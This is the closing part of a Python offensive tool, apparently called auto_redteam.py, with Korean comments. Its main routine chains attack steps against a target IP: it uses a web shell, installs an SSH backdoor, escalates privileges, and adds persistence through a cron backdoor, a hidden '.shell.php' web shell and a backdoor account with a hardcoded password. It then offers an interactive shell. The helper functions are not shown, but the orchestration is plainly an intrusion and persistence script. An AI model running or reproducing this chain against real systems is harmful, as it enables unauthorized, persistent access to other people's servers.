            self.print_error("웹쉘이 없습니다. 먼저 'redchain> imds' 실행하세요")
            return False

        # 2. SSH 키 생성
        if not self.generate_ssh_key():
            return False

        # 3. SSH 백도어 설치
        if not self.install_ssh_backdoor():
            return False

        # 4. SSH 접속 테스트
        if not self.test_ssh_access():
            return False

        # 5. 권한 상승
        has_root = self.privilege_escalation()

        # 6. Persistence 설치
        if has_root:
            self.install_persistence()
            self.install_cron_backdoor()
            self.install_webshell_backdoor()

        # 완료
        self.print_header(" 침투 완료!")

        print(f"{self.GREEN} SSH 백도어:{self.ENDC} ssh -i {self.ssh_key_path} ec2-user@{self.target_ip}")

        if has_root:
            print(f"{self.GREEN} Root 권한:{self.ENDC} sudo su")
            print(f"{self.GREEN} 백도어 계정:{self.ENDC} ssh sysupdate@{self.target_ip} (비밀번호: Sys@Update2024#Secure)")
            print(f"{self.GREEN} Cron 백도어:{self.ENDC} 10분마다 자동 재연결")
            print(f"{self.GREEN} 웹쉘 백도어:{self.ENDC} {self.base_url}/.shell.php?c=whoami")

        print()

        # 대화형 쉘 시작 여부
        choice = input(f"{self.YELLOW}대화형 SSH 쉘을 시작하시겠습니까? (y/n): {self.ENDC}")
        if choice.lower() == 'y':
            self.interactive_shell()

        return True


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 auto_redteam.py <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]

    redteam = AutoRedTeam(target_ip)
    redteam.run()


if __name__ == '__main__':
    main()
